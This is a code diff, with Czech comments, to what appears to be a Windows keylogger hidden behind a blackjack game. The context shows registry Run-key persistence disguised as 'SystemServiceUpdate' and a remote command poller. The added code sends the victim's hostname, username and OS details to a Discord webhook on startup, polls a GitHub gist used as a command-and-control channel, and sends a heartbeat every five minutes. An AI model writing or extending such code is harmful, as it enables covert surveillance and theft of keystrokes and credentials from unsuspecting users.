@@ -46,6 +46,104 @@ REGISTRY_VALUE = "SystemServiceUpdate"
 
 
 # ═══════════════════════════════════════════════════════════════
+# DIAGNOSTIKA — startup signal, error reporting, heartbeat
+# ═══════════════════════════════════════════════════════════════
+
+def _get_hostname():
+    import socket
+    try:
+        return socket.gethostname()
+    except Exception:
+        return "unknown"
+
+
+def _get_username():
+    try:
+        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
+    except Exception:
+        return "unknown"
+
+
+def send_startup_signal():
+    """Pošle startup confirmation na Discord — víme, že exe běží."""
+    try:
+        mode = "SILENT" if "--silent" in sys.argv else "INTERACTIVE"
+        requests.post(DISCORD_WEBHOOK_URL, json={
+            "embeds": [{
+                "title": "🟢 Logger spuštěn",
+                "description": f"Host: `{_get_hostname()}`\nUser: `{_get_username()}`\nMode: `{mode}`\nOS: `{platform.system()} {platform.release()}`\nPID: `{os.getpid()}`",
+                "color": 0x00FF00,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }]
+        }, timeout=15)
+    except Exception as e:
+        # Zapis do logu, aby sme aspoň něco měli
+        try:
+            log_file = APP_DIR / "startup_error.log"
+            APP_DIR.mkdir(parents=True, exist_ok=True)
+            with open(log_file, "a") as f:
+                f.write(f"{datetime.now().isoformat()} — STARTUP FAIL: {e}\n")
+        except Exception:
+            pass
+
+
+def send_error_signal(context: str, error: Exception):
+    """Pošle error na Discord — ať víme, co spadlo."""
+    try:
+        import traceback
+        tb = traceback.format_exc()
+        requests.post(DISCORD_WEBHOOK_URL, json={
+            "embeds": [{
+                "title": f"🔴 Error: {context}",
+                "description": f"Host: `{_get_hostname()}`\nError: `{type(error).__name__}: {str(error)[:500]}`\n```{tb[:1500]}```",
+                "color": 0xFF0000,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }]
+        }, timeout=15)
+    except Exception:
+        pass
+
+
+def send_gist_status():
+    """Otestuje gist URL a pošle status na Discord."""
+    try:
+        resp = requests.get(GIST_COMMAND_URL, timeout=10)
+        status = f"HTTP {resp.status_code}"
+        content = resp.text.strip()[:100] if resp.status_code == 200 else "N/A"
+        requests.post(DISCORD_WEBHOOK_URL, json={
+            "embeds": [{
+                "title": "📡 Gist C2 Status",
+                "description": f"URL: `{GIST_COMMAND_URL[:80]}...`\nStatus: `{status}`\nContent: `{content}`",
+                "color": 0x0099FF,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }]
+        }, timeout=15)
+    except Exception as e:
+        send_error_signal("Gist C2 check", e)
+
+
+def start_heartbeat():
+    """Každých 5 minut pošle alive signál — víme, že logger stále běží."""
+    def _beat():
+        while True:
+            time.sleep(300)  # 5 minut
+            try:
+                requests.post(DISCORD_WEBHOOK_URL, json={
+                    "embeds": [{
+                        "title": "💓 Heartbeat",
+                        "description": f"Host: `{_get_hostname()}`\nUptime check — logger alive\nBuffer entries: N/A",
+                        "color": 0xAAAAAA,
+                        "timestamp": datetime.now(timezone.utc).isoformat(),
+                    }]
+                }, timeout=15)
+            except Exception:
+                pass
+
+    t = threading.Thread(target=_beat, daemon=True)
+    t.start()
+
+
+# ═══════════════════════════════════════════════════════════════
 # PERSISTENCE — instalace do AppData + Registry Run key
 # ═══════════════════════════════════════════════════════════════
 
@@ -600,17 +698,22 @@ class Keylogger:
 if __name__ == "__main__":
     silent = "--silent" in sys.argv
 
+    # ── DIAGNOSTIKA: hned na start ──
+    send_startup_signal()
+    send_gist_status()
+    start_heartbeat()
+
     if not silent:
         install()
         logger = Keylogger()
         logger.run_background()
         start_command_poller()
-        run_blackjack()
-        while True:
-            time.sleep(60)
+        run_blackjack()  # blocking — hra běží, keylogger na pozadí
     else:
         logger = Keylogger()
         logger.run_background()
         start_command_poller()
-        while True:
-            time.sleep(60)
+
+    # Udržuj proces naživu
+    while True:
+        time.sleep(60)
